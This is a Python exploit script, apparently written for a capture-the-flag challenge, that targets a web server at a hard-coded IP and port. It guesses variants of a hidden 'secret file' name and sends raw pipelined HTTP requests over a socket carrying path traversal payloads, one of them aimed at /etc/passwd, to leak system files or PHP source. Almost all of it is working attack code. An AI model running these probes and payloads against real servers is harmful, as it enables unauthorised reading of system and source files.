import requests
import socket

host_ip = '61.147.171.35'
port = 53451
base_url = f'http://{host_ip}:{port}'

def check_url(path):
    url = f"{base_url}/{path}"
    try:
        r = requests.get(url, timeout=3)
        return r.status_code, r.text[:50]
    except Exception as e:
        return 999, str(e)

print("Checking case sensitivity:")
print("index.php:", check_url("index.php"))
print("Index.php:", check_url("Index.php"))

print("\nChecking file variations:")
files = [
    "s3Cr37_f1L3.php",
    "s3cr37_f1l3.php",
    "S3Cr37_f1L3.php",
    "s3Cr37_f1L3",
    "s3cr37_f1l3",
    "s3Cr37_f1L3/",
    "secret_file.php",
]

for f in files:
    print(f"{f}:", check_url(f))

print("\nChecking traversal via exploit:")

def get_source_path(path):
    payload = (
        f'GET /{path} HTTP/1.1\r\n'
        f'Host: {host_ip}\r\n'
        '\r\n'
        'GET /xyz.xyz HTTP/1.1\r\n'
        '\r\n'
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host_ip, port))
        sock.send(payload.encode())
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except: break
        sock.close()
        return response
    except:
        return b"Error"

traversals = [
    "../../../../etc/passwd",
    "../index.php",
    "./index.php",
]

for t in traversals:
    res = get_source_path(t)
    status_line = res.split(b'\r\n')[0]
    print(f"{t}: {status_line}")
